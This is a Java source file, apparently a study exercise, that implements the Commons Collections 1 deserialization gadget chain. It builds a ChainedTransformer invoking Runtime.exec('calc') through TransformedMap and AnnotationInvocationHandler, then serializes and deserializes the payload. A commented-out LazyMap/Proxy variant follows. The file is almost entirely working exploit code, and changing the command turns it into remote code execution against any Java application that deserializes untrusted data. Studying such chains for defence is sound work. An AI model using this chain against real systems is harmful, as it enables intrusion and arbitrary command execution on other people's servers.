import com.sun.net.httpserver.Filter;
import com.sun.xml.internal.bind.v2.model.runtime.RuntimeMapPropertyInfo;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

public class CC1 {
    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IOException, NoSuchFieldException {
        /**
         * commons-collections-3.1-3.2.1
         */
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);


        /**
         * 0x01.transforeredMap
         * AnnotationInvocationHandler
         */
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value","aaa");
        Map<Object,Object> transforeredMap = TransformedMap.decorate(map,null,chainedTransformer);
        Class c1 = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor1 = c1.getDeclaredConstructor(Class.class,Map.class);
        constructor1.setAccessible(true);
        Object o = constructor1.newInstance(Target.class,transforeredMap);
        serialize(o);
        unserialize("ser.bin");

        /**
         * 0x02.LazyMap
         * AnnotationInvocationHandler
         * Proxy
         *
         * 1.8.0_67 就修复，修改了 AnnotationInvocationHandler
         */

//        Map<Object,Object> lazyMap = LazyMap.decorate(new HashMap<>(),new ConstantTransformer(1)); //return new LazyMap(map, factory);
//        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,"aaa");
//        lazyMap.remove("aaa");
//
//        Class c2 = LazyMap.class;
//        Field field = c2.getDeclaredField("factory");
//        field.setAccessible(true);
//        field.set(lazyMap,chainedTransformer);
//
//        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler"); //AnnotationInvocationHandler是私有的，需要使用反射
//        Constructor constructor2 = cls.getDeclaredConstructor(Class.class,Map.class);
//        constructor2.setAccessible(true); // 设置可以访问私有类
//        InvocationHandler invokecationhandler = (InvocationHandler) constructor2.newInstance(Override.class,lazyMap); // 第一个参数 注解 可以任意传入
//        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class<?>[]{Map.class},invokecationhandler);
//        //上面这句会在执行 mapProxy.xxx() 的时候去调用 AnnotationInvocationHandler.invoke
//        //AnnotationInvocationHandler 套 AnnotationInvocationHandler
//        Object o = constructor2.newInstance(Override.class,mapProxy);
//        serialize(o);
//        unserialize("ser.bin"); // 1.8.0_65
    }
//
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}